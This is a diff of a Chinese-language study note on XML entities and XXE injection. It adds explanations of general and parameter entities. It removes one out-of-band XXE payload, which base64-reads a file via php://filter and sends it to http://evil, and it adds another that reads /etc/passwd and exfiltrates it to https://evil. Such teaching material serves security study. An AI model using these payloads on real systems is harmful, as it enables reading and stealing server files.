@@ -88,6 +88,51 @@
   * 本地文件读取：windows file:///c:/	linux file:///
   * 远程：http://、https://、ftp://
 
+#### XML参数
+
+在 XML 中，实体是用于表示文本片段的一种机制，允许在文档中引用、重复使用相同的文本。有两种类型的实体：通用实体（General Entities）和参数实体（Parameter Entities）。
+
+1. **通用实体（General Entities）：**
+
+   - **定义方式：** 通用实体通常用DTD中的 `<!ENTITY>` 声明进行定义。
+
+   - **使用范围：** 通用实体可以在文档的任何地方使用，包括元素内容、属性值和文档中的其他位置。
+
+   - **示例：**
+
+     ```
+     xmlCopy code<!DOCTYPE example [
+       <!ENTITY greeting "Hello, ">
+     ]>
+     
+     <root>
+       <message>&greeting;World!</message>
+     </root>
+     ```
+
+     在这个例子中，`&greeting;` 是一个通用实体，它被定义为字符串 "Hello, "，并在 `<message>` 元素中引用。
+
+2. **参数实体（Parameter Entities）：**
+
+   - **定义方式：** 参数实体通常用DTD中的 `<!ENTITY % name "value">` 声明进行定义。注意 `%` 符号用于区分通用实体和参数实体。
+
+   - **使用范围：** 参数实体主要用于定义在DTD内部，用于简化DTD的结构，提高可维护性和可重用性。参数实体不能在文档实例中引用，但可以在DTD内引用。
+
+   - **示例：**
+
+     ```
+     xmlCopy code<!DOCTYPE example [
+       <!ENTITY % greeting "Hello, ">
+       <!ENTITY message "%greeting;World!">
+     ]>
+     
+     <root>
+       <content>&message;</content>
+     </root>
+     ```
+
+     在这个例子中，`%greeting;` 是一个参数实体，被定义为 "Hello, "，然后 `%message;` 在DTD中使用了 `%greeting;` 来定义最终的文本 "Hello, World!"。
+
 ### XXE注入
 
 #### 原理
@@ -188,21 +233,21 @@
 %dtd;
 ```
 
-等同于:
-
-```xml
-<!DOCTYPE root SYSTEM [
-<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=target.txt">
-<!ENTITY % dtd "<!ENTITY send SYSTEM 'http://evil/?%xxe;'>">
-%dtd;
-]>
-<root>&send;</root>
-```
-
-
-
 * 最终结果来看，我们的目的是要发起请求http://evil/?想要读取的内容
 * 想要读取的内容就是php://filter/read=convert.base64-encode/resource=target.txt，target是我们想要读取的文件内容，这里默认目标主机是php语言，采用了php的xml外部实体引用所支持的php伪协议，伪协议中的convert.base64-encode/resource是对目标文件进行base64编码，防止出现预定义字符而解析出错（这里也可采用下面的方法防止出现预定义字符）
+
+
+
+* 其他常用payload
+
+ ```java
+ <!ENTITY % start "<![CDATA[">
+ <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+ <!ENTITY % end "]]>">
+ <!ENTITY % evil "%start;%xxe;%end;">
+ <!ENTITY % dtd "<!ENTITY send SYSTEM 'https://evil?%evil;'>">
+ %dtd;
+ ```
 
 #### 要包含的目标文件有预定义字符
 
